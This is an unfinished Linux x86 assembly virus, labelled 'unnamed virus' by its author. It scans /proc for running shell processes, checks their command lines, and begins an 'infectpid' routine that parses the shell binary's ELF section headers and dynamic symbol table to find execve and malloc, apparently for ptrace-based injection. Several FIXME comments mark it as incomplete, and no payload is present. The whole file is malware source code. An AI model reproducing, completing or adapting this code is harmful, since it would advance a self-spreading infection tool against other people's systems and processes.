/* unnamed virus
 * Not finished
 *
 * Roc Vallès Domènech
 */
#define __NR_exit	1
#define __NR_read	3
#define __NR_write	4
#define __NR_open	5
#define __NR_close	6
#define __NR_lseek	19
#define __NR_getpid	20
#define __NR_ptrace	26
#define __NR_getppid	64
#define __NR_readdir	89
#define PTRACE_ATTACH	16
#define PTRACE_DETACH	17
#define PTRACE_PEEKDATA	2
#define SEEK_SET	0
#define	SEEK_CUR	1
#define	SEEK_END	2
#define findbashgetdentrybuffer 6 /* it must be 20 (5*4) according to dirent size and considering 5 char pids, but somehow 5 segfaults. Does readdir() ignore count? */
#define DEBUG

.globl main
.text
main:
	call	findbash
	movl	$0, %ebx
	movl	$__NR_exit, %eax
	int	$0x80

findbash:
#ifdef	DEBUG
	movl	$7, %edx
	call _findbash_ownage
	.ascii "ownage\n"
_findbash_ownage:	
	popl	%ecx
	movl	$1, %ebx
	movl	$__NR_write, %eax
	int 	$0x80
#endif
	movl	$0, %ecx
	call _findbash_procpath
	.ascii "/proc\0"
_findbash_procpath:
	popl	%ebx
	movl	$__NR_open, %eax
	int	$0x80
	movl	%eax, %esi
	/* make room in stack for readdir() */
	movl	$0, %edx
_findbashallocstack:
	pushl	$0
	incl	%edx
	cmpl	$findbashgetdentrybuffer, %edx
	jnz	_findbashallocstack
_findbashgetdentry:
	movl	$findbashgetdentrybuffer, %edx /* Will jump here with %edx not ready later */
	movl	%esp, %ecx
	movl	%esi, %ebx
	movl	$__NR_readdir, %eax
	int	$0x80
	cmpl	$0, %eax
	jz	_findbashend
	movl	%esp, %ecx
	addl	$10, %ecx
	pushl	%ecx
	call	atoi
	addl	$4, %esp
	cmpl	$0, %eax
	jz	_findbashgetdentry
	pushl	%eax
	pushl	%ecx
	call	findbashpossiblevictim
	popl	%ecx
	popl	%eax
	jmp	_findbashgetdentry
_findbashend:
	/* free the room we made for readdir() */
	movl	$findbashgetdentrybuffer, %edx
_findbashfreestack:
	popl	%eax
	decl	%edx
	cmpl	$0, %edx
	jnz	_findbashfreestack
	movl	$__NR_close, %eax
	int	$0x80
	ret

/* my atoi() implementation.
 * It'll take a single arg from the stack, being a \0 terminated string, and return the apropiate unsigned integer in %eax.
 * 0 will be returned if non 0-9 characters are found, or if the number is zero.
 * %eax -> %edx, %esi, %edi will be castrated in the process, but it won't affect us :).
 */
atoi:
	pushl	%ebx
	pushl	%ecx
	pushl	%edx
	pushl	%esi
	pushl	%edi
	movl	$0, %ebx
	movl	$1, %ecx
	movl	$1, %edx
	movl	24(%esp), %edi
	movl	%edi, %esi
_atoifindend:
	cmpb	$0, (%esi)
	jz	_atoiatoi
	cmpb	$48, (%esi)
	jb	_atoiend
	cmpb	$57, (%esi)
	ja	_atoiend
	incl	%esi
	jmp	_atoifindend
_atoiatoi:
	movl	$0, %eax /* hafta clear it each cicle since it "overflows" from %al each time the result of the mul is >8bit. */
	decl	%esi
	movb	(%esi), %al
	subl	$48, %eax
	mul	%ecx
	addl	%eax, %ebx
	lea	(%ecx,%ecx,4), %ecx /* lea or movl? */
	addl	%ecx, %ecx
	cmpl	%edi, %esi
	jnz	_atoiatoi
_atoiend:
	movl	%ebx, %eax
	popl	%edi
	popl	%esi
	popl	%edx
	popl	%ecx
	popl	%ebx
	ret

/* findbashpossiblevictim will check if the given pid command is "/bin/bash"
 * it takes 2 args from stack: pid and beggining of the string of the pid number.
 * nothing is to be returned.
 * registers will be backed up and recovered :)
 */

findbashpossiblevictim:
	pushl	%eax
	pushl	%ebx
	pushl	%ecx
	pushl	%edx
	pushl	%esi
	pushl	%edi
	movl	28(%esp), %ecx
	movl	%ecx, %edi
#ifdef DEBUG
	movl	$1, %edx
	movl	$1, %ebx
_findbashpossiblevictimprint:
	cmpb	$0, (%ecx)
	movl	$__NR_write, %eax
	jz	_findbashpossiblevictimprintend
	int	$0x80
	incl	%ecx
	jmp	_findbashpossiblevictimprint
_findbashpossiblevictimprintend:
	call	_findbashpossiblevictimprintend_newline
	.ascii "\n"
_findbashpossiblevictimprintend_newline:
	popl	%ecx
	int	$0x80
	movl	%esp, %ecx
	addl	$10, %ecx
#endif
	movl	$0, %edx
_findbashpossiblevictimallocstack:
	pushl	$0
	incl	%edx
	cmpl	$5, %edx
	jnz	_findbashpossiblevictimallocstack
	call _findbashpossiblevictimproc
	.ascii "/proc///////cmdline"
_findbashpossiblevictimproc:
	popl	%esi
	movl	%edi, %eax /* lets store the pid string pointer here in the meanwhile */
	movl	%esp, %edi
	movl	$19, %ecx /* There'll a $0 at the end of the string no matter if we copy it or not since we allocated $20 by pushing zeroes. */
	rep	movsb
	movl	%eax, %esi
	subl	$13, %edi
_findbashpossiblevictimcopypid:
	cmpb	$0, (%esi)
	jz	_findbashpossiblevictimcmdline
	movsb
	jmp	_findbashpossiblevictimcopypid
_findbashpossiblevictimcmdline:
	movl	$0, %ecx
	movl	%esp, %ebx
	movl	$__NR_open, %eax
	int	$0x80
	cmpl	$0, %eax
	jz	_findbashpossiblevictimfailure
	movl	$10, %edx
	movl	%esp, %ecx
	movl	%eax, %ebx
	movl	$__NR_read, %eax
	int	$0x80
	movl	%eax, %edx
	movl	$__NR_close, %eax
	int	$0x80
	cmpl	$0, %edx
	jz	_findbashpossiblevictimfailure
	call	_findbashpossiblevictimcmdlinecmp
	.ascii "dash\0" /* FIXME: "/bin/bash\0" whatever */
	_findbashpossiblevictimcmdlinecmp:
	popl	%esi
	movl	%esp, %edi
	movl	$5, %ecx /* FIXME: 10 for /bin/bash */
	repe	cmpsb
	jnz	_findbashpossiblevictimfailure
	movl	52(%esp), %ecx
	pushl	%ecx
	call	infectpid
	popl	%ecx
	_findbashpossiblevictimfailure:
	/* free() the pushes! */
	movl	$0, %edx
_findbashpossiblevictimfreestack:
	popl	%ecx
	incl	%edx
	cmpl	$5, %edx
	jnz	_findbashpossiblevictimfreestack
	popl	%edi
	popl	%esi
	popl	%edx
	popl	%ecx
	popl	%ebx
	popl	%eax
	ret
	
/* infectpid will infect a given pid 
 * the argument will be got from the stack
 */
 
infectpid:
	pushl	%ebp
	pushl	%eax
	pushl	%ebx
	pushl	%ecx
	pushl	%edx
	pushl	%esi
	pushl	%edi
	movl	$6, %ecx
	movl	$0, %eax
__infectpidallocstack:
	pushl	%eax
	loop	__infectpidallocstack
	call	_infectpidgetbash
	.ascii "/bin/dash\0" /* FIXME: dash? */
_infectpidgetbash:
	movl	$0, %ecx
	popl	%ebx
	movl	$__NR_open, %eax /* I could have used mmap(), but this was more fun in some way. Am I insane? :) */
	int	$0x80
	cmpl	$0, %eax
	jz	_infectpidend
	/* TODO: is it an ELF? is it x86? do all reads succeed? Insane paranoia */
	/* we need e_shentsize, e_shoff and e_shnum */
	movl	$SEEK_SET, %edx
	movl	$46, %ecx /* Ehdr->e_shentsize & Ehdr->e_shnum both short */
	movl	%eax, %ebx
	movl	$__NR_lseek, %eax
	int	$0x80
	movl	$4, %edx
	pushl	$0
	movl	%esp, %ecx
	movl	$__NR_read, %eax
	int	$0x80
	movl	$0, %esi
	movl	$0, %edi
	popw	%si /* Ehdr->e_shentsize */
	popw	%di /* Ehdr->e_shnum */
	movl	$SEEK_SET, %edx
	movl	$32, %ecx /* Ehdr->e_shoff */
	movl	$__NR_lseek, %eax
	int	$0x80
	movl	$4, %edx
	pushl	$0
	movl	%esp, %ecx
	movl	$__NR_read, %eax
	int	$0x80
	movl	$SEEK_SET, %edx
	popl	%ecx
	addl	$4, %ecx
	movl	$__NR_lseek, %eax
	int	$0x80
_infectpidcheckdynsym:
	movl	$4, %edx
	pushl	$0
	movl	%esp, %ecx
	movl	$__NR_read, %eax
	int	$0x80
	popl	%eax
	cmpl	$11, %eax
	jz	_infectpidthereisdynsym
	decl	%edi
	cmpl	$0, %edi
	jz	_infectpidcloseend /* No dymsym = static binary = failure */
	movl	$SEEK_CUR, %edx
	movl	%esi, %ecx
	subl	$4, %ecx /* reading 4 seeks 4 */
	movl	$__NR_lseek, %eax
	int	$0x80
	jmp	_infectpidcheckdynsym
	/* FIXME: read list of strings, find symbols, etc */
	_infectpidcloseend:
	movl	$__NR_close, %eax
	int	$0x80
	movl	$6, %ecx
_infectpidfreestack:
	popl	%eax
	loop	_infectpidfreestack
	popl	%edi
	popl	%esi
	popl	%edx
	popl	%ecx
	popl	%ebx
	popl	%eax
	popl	%ebp
_infectpidend:
	ret
_infectpidthereisdynsym:
	movl	$SEEK_CUR, %edx
	movl	$16, %ecx /* dymsymShdr->sh_link */
	movl	$__NR_lseek, %eax
	int	$0x80
	movl	%eax, %esi 
	subl	$24, %esi /* dymsymShdr will serve as reference at %esi */
	movl	$4, %edx
	pushl	$0
	movl	%esp, %ecx
	movl	$__NR_read, %eax
	int	$0x80
	popl	%eax
	movl	%eax, %edi /* dymsymShdr->sh_link value at %edi */
	movl	$SEEK_SET, %edx
	movl	$46, %ecx /* Ehdr->e_shentsize */
	movl	$__NR_lseek, %eax
	int	$0x80
	movl	$2, %edx /* FIXME! -> why? e_shentsize is 2 byte. */
	pushw	$0
	movl	%esp, %ecx
	movl	$__NR_read, %eax
	int	$0x80
	movl	$0, %eax
	popw	%ax
	mul	%edi /* FIXME: where's our FD now? */
	movl	%eax, %edi
	movl	$SEEK_SET, %edx
	movl	$32, %ecx /* Ehdr->e_shoff */
	movl	$__NR_lseek, %eax
	int	$0x80
	movl	$4, %edx
	pushl	$0
	movl	%esp, %ecx
	movl	$__NR_read, %eax
	int	$0x80
	movl	$SEEK_SET, %edx
	popl	%ecx
	movl	$__NR_lseek, %eax
	int	$0x80	
	movl	$SEEK_CUR, %edx
	movl	%edi, %ecx
	addl	$16, %ecx
	movl	$__NR_lseek, %eax
	int	$0x80
	movl	$4, %edx
	movl	%esp, %ecx /* Storing strtabheader->sh_offset here :) */
	movl	$__NR_read, %eax
	int	$0x80
	movl	$SEEK_SET, %edx
	movl	%esi, %ecx
	addl	$36, %ecx /* dymsymShrd->sh_entsize */
	movl	$__NR_lseek, %eax
	int	$0x80
	movl	$4, %edx
	leal	8(%esp), %ecx
	movl	$__NR_read, %eax 
	int	$0x80 /* Storing symbol table element size here :) */
	movl	$SEEK_SET, %edx
	movl	%esi, %ecx
	addl	$16, %ecx /* dymsymShdr->sh_offset */
	movl	$__NR_lseek, %eax
	int	$0x80 /* Storing pointer to first element of the symbol table */
	movl	$4, %edx
	leal	12(%esp), %ecx
	movl	$__NR_read, %eax
	int	$0x80
	movl	$SEEK_SET, %edx
	movl	%esi, %ecx
	addl	$20, %ecx /* dymsymShdr->sh_size */
	movl	$__NR_lseek, %eax
	int	$0x80
	movl	$4, %edx
	leal	4(%esp), %ecx /* we temporaly use this :) */
	movl	$__NR_read, %eax 
	int	$0x80
	movl	4(%esp), %eax
	addl	%eax, 12(%esp) /* Storing the pointer to the ending of the symbol table here (sh_size+sh_offset) */
	/* at this point, we have
	 * (%esp) is the beggining of the string table.
	 * 4(%esp) is the first element of the symbol table
	 * 8(%esp) is the size of a symbol table element
	 * 12(%esp) is the pointer to the ending of the symbol table (which seems to be the same as %esp but better don't assume it, specially after the code to calculate it is already written)
	 * 16(%esp) will be the pointer to execve
	 * 20(%esp) will be the pointer to malloc
	 * LEFTHERE FIXME: port to .rel.plt, which works with both old and new binaries.
	 */
	 
	movl	$__NR_close, %eax /* Closing the binary, we won't need it open anymore */
	int	$0x80
	/* ... */
	movl	$6, %ecx /* _infectpidfreestack will need this */
	jmp	_infectpidfreestack
